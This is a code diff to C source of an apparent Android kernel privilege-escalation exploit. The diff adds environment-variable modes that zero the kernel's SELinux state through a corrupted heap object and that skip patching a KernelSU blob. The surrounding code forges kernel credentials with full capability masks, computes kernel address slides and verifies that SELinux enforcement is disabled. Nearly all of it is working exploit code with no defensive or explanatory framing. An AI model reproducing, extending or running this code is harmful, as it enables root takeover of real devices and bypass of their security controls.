@@ -222,10 +222,12 @@ static int g_pairs=8192,g_delay=0,g_mode=0,g_att=3,g_reps=1,g_churn=0,g_chwait=5
 static unsigned long long g_fs[FSMAX];static int g_nfs=0;
 static unsigned long long g_fakekva;
 static int g_stage=0,g_ntg=0,g_selmode=1;
+static int selzero_mode(void){return getenv("O3P_SELZERO")!=NULL;}
+static int nocodepatch_mode(void){return getenv("O3P_NO_CODEPATCH")!=NULL;}
 static void build_pattern(void){
   memset(pat,0,sizeof pat);
   { unsigned long long v=MARKVAL; memcpy(pat+mk,&v,8); }
-  { unsigned long long v=(g_selmode&&g_stage==0)?(g_fakekva|0x100ULL):g_fakekva; memcpy(pat+off+0xe0,&v,8); }
+  { unsigned long long v=(g_selmode&&g_stage==0)?(selzero_mode()?0ULL:(g_fakekva|0x100ULL)):g_fakekva; memcpy(pat+off+0xe0,&v,8); }
   { unsigned long long v=0; memcpy(pat+off+0xe8,&v,8); }
   memcpy(pat+off+0xf0,&S,8);
 }
@@ -269,7 +271,7 @@ static int detect_hit(void){
   if(g<=0)return 0;
   if(vv[0]!=MARKVAL)return 0;
   for(int k=0;k<n;k++)printf("  D[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
-  { unsigned long long ex=(g_selmode&&g_stage==0)?(g_fakekva|0x100ULL):g_fakekva; if(vv[1]!=ex||vv[2]!=S)printf("  WARN node mismatch\n"); }
+  { unsigned long long ex=(g_selmode&&g_stage==0)?(selzero_mode()?0ULL:(g_fakekva|0x100ULL)):g_fakekva; if(vv[1]!=ex||vv[2]!=S)printf("  WARN node mismatch\n"); }
   return 1;
 }
 static void drain_all_pcp(void){
@@ -314,7 +316,7 @@ static void fill_fake_cred(unsigned long long naddr){
  memset(g_pmap,0,4096);
  unsigned long long *q=(unsigned long long*)g_pmap;
  q[0]=g_fakekva; q[1]=0; q[2]=naddr; q[3]=0;
-  if(g_selmode&&g_stage==0){q[0x108/8]=naddr;q[0x110/8]=naddr;}
+  if(g_selmode&&g_stage==0&&!selzero_mode()){q[0x108/8]=naddr;q[0x110/8]=naddr;}
  q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
  set_secptr(q);q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
 }
@@ -404,7 +406,7 @@ static int do_attempt(int att, pid_t *outpid){
    printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
  }
   mk=0x1a00ULL;MARK=PAGE+mk;
-  if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=g_sel; } else S=PTASK+0x908;
+  if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908;
 printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
  fill_fake_cred(N);
  build_pattern();
@@ -687,6 +689,7 @@ static unsigned char *ksu_blob_load(size_t *plen) {
 }
 
 static int ksu_patch(unsigned char *d,size_t len,unsigned long long slide){
+  if(nocodepatch_mode()){printf("KSU_CODEPATCH skip\n");fflush(stdout);return 0;}
   unsigned long long shoff; unsigned short shentsize=0,shnum=0;
   if(len<64||d[0]!=0x7f||d[1]!='E')return -1;
   memcpy(&shoff,d+0x28,8); memcpy(&shentsize,d+0x3a,2); memcpy(&shnum,d+0x3c,2);
@@ -914,16 +917,23 @@ static void reap_calib(pid_t pid){
  tlen=read_trace(tbuf,48u<<20);
  printf("waitpid=%d status=%d trace=%zu\n",(int)wr,st,tlen);fflush(stdout);
  if(g_selmode&&g_stage==0){
-  unsigned long long ad[6],vv[6];int n=0;
-  ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
+  int z=selzero_mode();
+  unsigned long long ad[8],vv[8];int n=0;
+  ad[n++]=z?(g_sel-7ULL):g_sel;ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
   int g=read_addrs(ad,vv,n);
-  printf("SELREAD got=%d\n",g);fflush(stdout);
+  printf("SELREAD got=%d zero=%d\n",g,z);fflush(stdout);
   if(g>0){int k;
    for(k=0;k<n;k++)printf("  Q[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
-   {unsigned long long ex=g_fakekva|0x100ULL;
+   if(z){
+    int ok=(vv[0]==0ULL)&&((vv[1]&0xffULL)==0ULL)&&(((vv[1]>>8)&0xffULL)!=0ULL);
+    printf("SELWRITE target=0x%llx want=0x0 val=0x%llx %s state=0x%llx\n",ad[0],vv[0],ok?"SEL_OK":"SEL_FAIL",vv[1]);
+    if(ok)g_stage++;
+   } else {
+    unsigned long long ex=g_fakekva|0x100ULL;
     int ok=(vv[0]==ex)&&((vv[0]&0xffULL)==0ULL)&&(((vv[0]>>8)&0xffULL)!=0ULL);
     printf("SELWRITE target=0x%llx want=0x%llx val=0x%llx %s\n",ad[0],ex,vv[0],ok?"SEL_OK":"SEL_FAIL");
-    if(ok)g_stage++;}
+    if(ok)g_stage++;
+   }
   }
   read_file_print("/sys/fs/selinux/enforce","ENFORCE");
   {int fd=open("/data/local/tmp/canary_t34",O_WRONLY|O_CREAT,0666);printf("SHELL_CREATE fd=%d\n",fd);if(fd>=0)close(fd);}
